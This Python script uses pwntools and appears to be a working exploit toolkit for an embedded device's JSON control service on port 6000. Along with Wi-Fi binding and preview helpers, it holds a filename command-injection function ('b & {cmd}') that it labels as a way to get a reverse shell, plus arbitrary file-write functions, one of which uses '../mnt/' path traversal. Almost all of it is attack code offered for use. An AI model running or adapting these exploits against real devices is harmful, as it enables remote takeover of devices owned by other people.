import json
import base64
import socket
import hashlib
import time
from pwn import *
from util import *

xor_key = b'89JFSjo8HUbhou5776NJOMp9i90ghg7Y78G78t68899y79HY7g7y87y9ED45Ew30O0jkkl'

# XOR function
def xor_encode(input_bytes, key):
    encoded_bytes = bytearray(len(input_bytes))
    key_length = len(key)

    for i in range(len(input_bytes)):
        encoded_byte = input_bytes[i] ^ key[i % key_length]
        encoded_bytes[i] = encoded_byte

    return encoded_bytes

def ap_bind(ssid, password, bind_key):
    info(f"Sending ap_bind with credentials:\nSSID: {ssid}, PWD: {password}, BINDKEY: {bind_key}")

    # Create the JSON structure
    json_data = {
        "operator": "ap_bind",
        "data": f"b={bind_key}&s={base64.b64encode(ssid.encode()).decode()}&p={base64.b64encode(xor_encode(password.encode(), xor_key)).decode()}"
    }

    # Convert JSON to string
    json_string = json.dumps(json_data)

    info("Sending:")
    pretty_print_json(json_string)

    # IP address and port of the server
    server_ip = "192.168.10.1"
    server_port = 6000

    # Create a socket and connect to the server
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((server_ip, server_port))

    # Send the JSON data to the server
    client_socket.sendall(json_string.encode())

    # Receive and print the response
    response = client_socket.recv(1024).decode()
    info("Response from server:")
    pretty_print_json(response)

    if ('OK' in response):
        success("Success!")

    # Close the socket
    client_socket.close()

def ap_log():
    # ap_log crashes everything as the '/mnt/log' directory is not present by default
    # creating this directory stops it from crashing when this script is sent

    # Define the JSON data
    data = {
        "operator": "ap_log",
    }

    # Convert the data to JSON format
    json_data = json.dumps(data)

    # Define the target IP address and port
    target_ip = "192.168.10.1"
    target_port = 6000

    # Create a TCP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Connect to the target IP and port
        sock.connect((target_ip, target_port))

        # Send the JSON data
        sock.sendall(json_data.encode())

        print(f"JSON data sent to {target_ip}:{target_port}:\n{json_data}")

        # Optionally, you can wait for a response here if the server is expected to send one.
        response = sock.recv(1024)
        success(f"Received response:\n{response.decode()}")

    except Exception as e:
        print(f"Error: {str(e)}")

    finally:
        # Close the socket
        sock.close()

def get_tnp_uid():
    ap_preview_resp = ap_preview()
    tnp_uid_string = ap_preview_resp["tnp_uid"]
    tnp_uid_split = tnp_uid_string.split('-')
    return [tnp_uid_split[0], int(tnp_uid_split[1]), tnp_uid_split[2]]

def ap_preview():
    # Define the JSON data
    data = {
        "operator": "ap_preview",
        "time": int(time.time())  # UTC timestamp in seconds
    }

    # Convert the data to JSON format
    json_data = json.dumps(data)

    # Define the target IP address and port
    target_ip = "192.168.10.1"
    target_port = 6000

    # Create a TCP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Connect to the target IP and port
        sock.connect((target_ip, target_port))

        # Send the JSON data
        sock.sendall(json_data.encode())

        info("Sending ap_preview request to port 6000:")
        pretty_print_json(json_data)

        # Optionally, you can wait for a response here if the server is expected to send one.
        response = sock.recv(1024)
        success(f"Received response:")
        pretty_print_json(response.decode())

        return json.loads(response.decode())

    except Exception as e:
        print(f"Error: {str(e)}")

    finally:
        # Close the socket
        sock.close()

def ap_update_name_cmd_injection(ip, port, cmd):
    info("Doing filename command injection for reverse shell")

    parameters = {
        "operator": "ap_update_name",
        "name": f"b & {cmd}", # 31 total char limit for cmd
        "length": 0,  # Placeholder for length
        "md5": "ffffffffffffffffffffffffffffffff"
    }

    # Create a JSON string from the parameters
    json_string = json.dumps(parameters)

    # Define the server IP address and port
    server_ip = "192.168.10.1"
    server_port = 6000

    info("Sending:")
    pretty_print_json(json_string.encode())

    # Create a socket and connect to the server
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((server_ip, server_port))

    # Send the JSON string to the server
    client_socket.send(json_string.encode())

    # Wait for a response (assuming a maximum response size of 1024 bytes)
    response = client_socket.recv(1024)

    # Decode and print the response
    info("Response from server:")
    pretty_print_json(response.decode())

    # Check if the response is "OK" before sending the payload data (file contents)
    payload_data = b'hello'
    if "OK" in response.decode():
        # Send the payload data
        info(f"Filling file with data: {payload_data}")

        client_socket.send(payload_data)

        success("Done!")

    # Close the socket
    client_socket.close()

def ap_update_name_file_write(filename):
    parameters = {
        "operator": "ap_update_name",
        "name": filename.split('/')[-1], # 31 total char limit for cmd
        "length": 0,  # Placeholder for length
        "md5": ""
    }

    # Read the contents of the payload file and update the "length" parameter
    with open(filename, "rb") as file:
        payload_data = file.read()
        parameters["length"] = len(payload_data)

    # Create a JSON string from the parameters
    json_string = json.dumps(parameters)

    # Define the server IP address and port
    server_ip = "192.168.10.1"
    server_port = 6000

    info(f"Sending file: {filename.split('/')[-1]}")

    # Create a socket and connect to the server
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((server_ip, server_port))

    # Send the JSON string to the server
    pretty_print_json(json_string)
    
    client_socket.send(json_string.encode())

    # Wait for a response (assuming a maximum response size of 1024 bytes)
    response = client_socket.recv(1024)

    # Decode and print the response
    info("Response from server:")
    pretty_print_json(response.decode())

    # Check if the response is "OK" before sending the payload data
    if "OK" in response.decode():
        # Send the payload data
        info(f"Sending contents...")

        client_socket.send(payload_data)

        success("Done!")
    else:
        info("File already exists on device")

    # Close the socket
    client_socket.close()

def ap_update_name_file_write_sd(filename):
    parameters = {
        "operator": "ap_update_name",
        "name": '../mnt/' + filename.split('/')[-1], # 31 total char limit for cmd
        "length": 0,  # Placeholder for length
        "md5": ""
    }

    # Read the contents of the payload file and update the "length" parameter
    with open(filename, "rb") as file:
        payload_data = file.read()
        parameters["length"] = len(payload_data)

    # Create a JSON string from the parameters
    json_string = json.dumps(parameters)

    # Define the server IP address and port
    server_ip = "192.168.10.1"
    server_port = 6000

    info(f"Sending file to /tmp: {filename.split('/')[-1]}")

    # Create a socket and connect to the server
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((server_ip, server_port))

    # Send the JSON string to the server
    client_socket.send(json_string.encode())

    # Wait for a response (assuming a maximum response size of 1024 bytes)
    response = client_socket.recv(1024)

    # Decode and print the response
    info("Response from server:")
    pretty_print_json(response.decode())

    # Check if the response is "OK" before sending the payload data
    if "OK" in response.decode():
        # Send the payload data
        info(f"Sending contents")

        client_socket.send(payload_data)

        success("Done!")
    else:
        info("File already exists on device")

    # Close the socket
    client_socket.close()
